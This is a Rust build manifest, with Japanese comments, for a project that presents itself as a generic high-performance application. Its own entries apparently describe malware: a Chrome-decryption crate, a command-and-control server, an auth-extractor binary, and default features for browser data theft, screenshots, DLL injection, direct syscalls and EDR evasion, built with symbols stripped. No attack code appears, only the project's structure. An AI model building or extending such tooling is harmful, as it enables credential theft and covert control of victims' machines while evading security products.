[package]
name = "aoi_64"
version = "0.1.0"
edition = "2021"
default-run = "aoi_64"
description = "A high-performance Rust application with modular architecture"
license = "MIT"
readme = "README.md"

[workspace]
members = ["chrome_decrypt", "c2_server"]
resolver = "2"

[profile.release]
opt-level = "z"          # 最大サイズ最適化
lto = "fat"             # 完全なリンク時最適化
codegen-units = 1       # 単一コード生成ユニット
panic = "abort"         # panicの代わりにabort
strip = "symbols"       # シンボル削除
debug = false           # デバッグ情報なし
rpath = false          # rpath無効
overflow-checks = false # オーバーフローチェック無効
debug-assertions = false # デバッグアサーション無効
incremental = false     # インクリメンタルコンパイル無効
split-debuginfo = "off" # デバッグ情報分割無効

# devプロファイルも最適化
[profile.dev]
opt-level = 1
debug = true
overflow-checks = false
incremental = false
debug-assertions = false

[lib]
name = "aoi_64"
path = "src/lib.rs"

[[bin]]
name = "decrypt"
path = "src/bin/decrypt.rs"


[[bin]]
name = "auth_extractor"
path = "src/bin/auth_extractor.rs"


[[bin]]
name = "rsa_gen"
path = "src/bin/rsa_gen.rs"

[[bin]]
name = "func_test"
path = "src/bin/func_test.rs"

[dependencies]
serde = { version = "1.0", default-features = false, features = ["derive", "alloc"] }
serde_json = { version = "1.0", default-features = false, features = ["alloc"] }

# MessagePack（最小機能のみ）
rmp-serde = { version = "1.3", default-features = false }

# 基本ユーティリティ（最小化）
base64 = { version = "0.22", default-features = false, features = ["std"] }

# AEAD（最小機能のみ）
aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
chacha20poly1305 = { version = "0.10", default-features = false, features = ["alloc"] }
rsa = { version = "0.9.8", features = ["pem"] }
sha2 = { version = "0.10", default-features = false }

# システム情報（最小化）
anyhow = { version = "1.0", default-features = false }  # エラー処理（最小化）
libloading = { version = "0.8", default-features = false }  # NSSで必要
which = { version = "8.0.0", default-features = false, features = ["real-sys"] }  # NSSで必要
dirs = { version = "6.0.0", default-features = false }  # ディレクトリ検索用

# EDR回避テスト専用依存関係
regex = { version = "1.10", default-features = false, features = ["std"], optional = true }
hex = { version = "0.4", default-features = false, features = ["alloc"] }  # 常に利用可能にする（暗号化キー用）
once_cell = { version = "1.19", optional = true }

# 条件付き依存関係（機能別）
log = { version = "0.4", default-features = false, optional = true }  # ログ機能
indicatif = { version = "0.18.0", default-features = false, features = ["unicode-width"], optional = true }  # プログレスバー
# 軽量な代替実装（手動実装に置換）
# clap = { version = "4.0", default-features = false, features = ["std"] }  # 手動CLI解析に置換
chrono = { version = "0.4", default-features = false, features = ["std", "clock"] }  # 最小時刻処理（c2_server_tlsでは不使用）
tokio = { version = "1.0", default-features = false, features = ["rt-multi-thread", "macros", "time", "sync", "signal", "net", "fs"] }
uuid = { version = "1.0", default-features = false, features = ["v4"] }  # UUID生成
sysinfo = { version = "0.37.1" }  # システム情報取得（ハートビート用）

# Workspace internal crate for Chrome decryption (Windows-only code)
chrome_decrypt = { path = "chrome_decrypt" }

encoding_rs = { version = "0.8.35", default-features = false, features = ["alloc"] }
hostname = { version = "0.4", default-features = false }  # ホスト名取得用
num_cpus = { version = "1.0", default-features = false }  # CPU情報取得用

# ---- 機能フラグ（後方互換性削除・最適化版） ----
[features]
# デフォルトで全機能有効（単純化）
default = ["network", "browser", "screenshot", "inject", "logging", "datetime", "server_diagnostics", "direct-syscall", "edr-testing"]

# 主要機能（個別無効化可能）
network = ["dep:minreq"]                    # ネットワーク通信
browser = ["dep:rusqlite"]                  # ブラウザデータ取得
screenshot = ["dep:image", "dep:scrap"]     # スクリーンショット
inject = []                                 # DLLインジェクション（clap削除）
logging = ["dep:log"]                       # ログ機能（最小化対応）
datetime = []                               # 日時処理機能
server_diagnostics = []                     # サーバー診断エンドポイント
direct-syscall = []                         # Direct Syscall機能（デフォルト有効）
edr-testing = ["dep:regex", "dep:once_cell"]  # EDR回避テスト機能

# optional deps（必要時だけ読み込む）
[dependencies.minreq]
version = "2.12"
default-features = false
features = ["https-rustls"]
optional = true

[dependencies.image]
version = "0.25"
default-features = false
features = ["png"]  # JPEG不要なら削減
optional = true

[dependencies.rusqlite]
version = "0.37.0"
default-features = false
features = ["bundled", "modern_sqlite"]
optional = true

[dependencies.scrap]
version = "0.5"
optional = true

# Windows API（EDRテスト用拡張モジュール）
[target.'cfg(windows)'.dependencies]
windows = { version = "0.62.0", default-features = false, features = [
  "Win32_Foundation",
  "Win32_Security_Cryptography",
  "Win32_System_Threading",
  "Win32_System_Memory",
  "Win32_System_Com",
  "Win32_System_Ole",
  "Win32_System_Rpc",
  "Win32_System_Wmi",
  "Win32_System_Variant",
  "Win32_System_Diagnostics",
  "Win32_System_Diagnostics_Debug",
  "Win32_UI_Shell",
  "Win32_UI_Input_KeyboardAndMouse",
  "Win32_UI_WindowsAndMessaging",
  "Win32_System_LibraryLoader",
  "Win32_System_SystemInformation",
  "Win32_Storage_FileSystem",  
  "Win32_System_Time",
  "Win32_NetworkManagement_IpHelper",
  "Win32_NetworkManagement_Ndis",
  "Win32_Networking_WinSock",
  "Win32_System_Registry",
  "Win32_System_ProcessStatus",
  "Win32_System_Kernel",
  "Win32_System_Environment",
  "Win32_Security",
  "Win32_System_Console",
  "Win32_System_Pipes",
  "Win32_System_WindowsProgramming",
  "Win32_System_Diagnostics_ToolHelp",
  "Win32_System_Diagnostics_ProcessSnapshotting",
  "Win32_NetworkManagement_NetManagement",
  "Win32_Storage_InstallableFileSystems",
  "Win32_System_Services",
  "Win32_System_Power",
  "Win32_System_Hypervisor",
  "Win32_Security_Authentication_Identity",
  "Win32_Security_Authorization",
  "Win32_UI_Controls",
  "Win32_Graphics_Gdi",
  "Win32_System_Ioctl",
] }
